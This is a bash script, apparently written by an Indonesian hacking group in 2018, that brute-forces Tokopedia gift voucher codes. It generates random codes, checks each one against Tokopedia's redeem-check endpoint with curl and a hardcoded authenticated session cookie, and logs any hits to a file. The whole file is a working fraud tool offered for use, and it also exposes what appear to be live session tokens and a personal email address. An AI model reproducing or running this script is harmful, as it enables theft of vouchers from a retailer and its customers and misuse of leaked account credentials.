#Coded By AchonkJust - Extreme Crew
#issued 07-Mar-2018
#ToloPedia Extrap auto redeem voucher
#Update!!
#!/bin/bash/sh
putih='\033[0m'
ijo='\e[38;5;82m'
merah='\e[38;5;196m'
 header(){
printf "${ijo}"
printf "     ___        __                _____ _____ _____   _       ________    \n"
printf "    /   | _____/ /_  ____  ____  / ___// ___// ___/  (_)_  __/ ____/ /_   \n"
printf "   / /| |/ ___/ __ \/ __ \/ __ \/ __ \/ __ \/ __ \  / / / / /___ \/ __/   \n"
printf "  / ___ / /__/ / / / /_/ / / / / /_/ / /_/ / /_/ / / / /_/ /___/ / /_     \n"
printf " /_/  |_\___/_/ /_/\____/_/ /_/\____/\____/\____/_/ /\__,_/_____/\__/     \n"
printf "==========ToloPedia Extrap Voucher=============/___/ By Extreme.Crew 	  \n"
}
rm -f extreme.crew
clear
header
if [ ! $1 ];then
echo "1 Akun Max 10 kali generate"
echo "Usage : $0 <jumlah generate>"
echo "EX : $0 10"
exit
fi
#Edit Your Cookies Here
ngelog(){
cok="_gorilla_csrf=MTUyNDQ5MDA2MnxJbEpyVGxNMFdqQk5kMjFqYjNrclpHZHJLM0pNVEVvdmQwNUpiSE4zVG1SSGN6Rm9UV1ZVVG5SeGNXODlJZ289fGNxAQUhlUo3GnEpCvSg7fV-uqTUe6Rxh4IqIo6GQvRg; _BID_TOKOPEDIA_=270b50252c10cc87501fd0002072f346; insUserData=%7B%22email%22%3A%22muhamadrifqi%40india2in.com%22%7D; __sonar=16738934989123727502; state=eyJsZCI6Imh0dHBzOi8vYWNjb3VudHMudG9rb3BlZGlhLmNvbS90aGFua3M_dGhlbWU9ZGVmYXVsdFx1MDAyNmxkPVx1MDAyNmFjdGl2YXRpb25fdHlwZT01IiwicmVmIjoiaHR0cHM6Ly93d3cudG9rb3BlZGlhLmNvbSIsInV1aWQiOiI5NWM3NjZjZC0wYzY5LTRhZjktOGIzYS05NGE4NjQ4Y2E4OTUiLCJ0aGVtZSI6ImRlZmF1bHQifQ; l=1; ins-gaSSId=5a495b26-4329-d77a-e3fb-99bb306a5072_1524493531; insdrSV=4; _ID_autocomplete_=91b5fdf696d341b9a53a04b772b9b115; _gat_UA-9801603-1=1; o_Pulsa=eyJsYXN0X2RlY2xpbmUiOiIiLCJyZWZlcnJlciI6Imh0dHBzOi8vcHVsc2EudG9rb3BlZGlhLmNvbS9naWZ0LWNhcmQvdG9rb3BlZGlhL3JlZGVlbS8iLCJpc19taWNyb3NpdGUiOmZhbHNlLCJ1dWlkIjoiMjQ1NWM4MTEtYTE0Ni00ZWVlLWFjZGQtOTZkOWNkNzNhYmVlIiwiaXNfYWpheCI6dHJ1ZX0; _SID_Tokopedia_=0qvKGJiesRjEsObdsBg-fjq8IUFV4WaYmgtSOPNIemipCHwssB7fg5yD6IzN7Npnpx8qY0Ia29_8nmbCZ36tXFvGhewUTCN6NYuLTQa7mKoCNukOZ5BQv4nYlLDr2i_u; pulsa-aff=undefined; _ga=GA1.2.1244198477.1524489899; _gid=GA1.2.703229495.1524489899; _dc_gtm_UA-9801603-23=1; scs=%7B%22t%22%3A1%7D; _ampSES=b62aedf1e5SES6abda34693d6-30798-1524490069730; _ampUITN=44bac859f0bot77ccad0b3c0a-30798-1524490069734; _ampNV=0; _ampRV=1; _ampCon=Canada; _ampCity=Montreal"
	curl -s -X GET \
--url "https://pulsa.tokopedia.com/gift-card/tokopedia/redeem/check?voucher_code=FPL$1" \
-H "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" \
-H "accept-encoding: gzip, deflate, br" \
-H "cookie: $cok" \
-H "accept-language: en-US,en;q=0.9" \
-H "cache-control: max-age=0" \
-H "upgrade-insecure-requests: 1" \
-H "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTssML, like Gecko) Ubuntu Chromium/65.0.3325.181 Chrome/65.0.3325.181 Safari/537.36"
}

for generate in $(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 13 | head -n 10); do
	ngegas=$(ngelog $generate | grep -Po "(?<=\"message\":\").*?(?=\"\,\")")
	if [[ "$ngegas" ]]; then
		echo "$ngegas"
		echo "[-$ngegas-] $generate" >> tokopedia.txt
	fi
done
rm -f extreme.crew
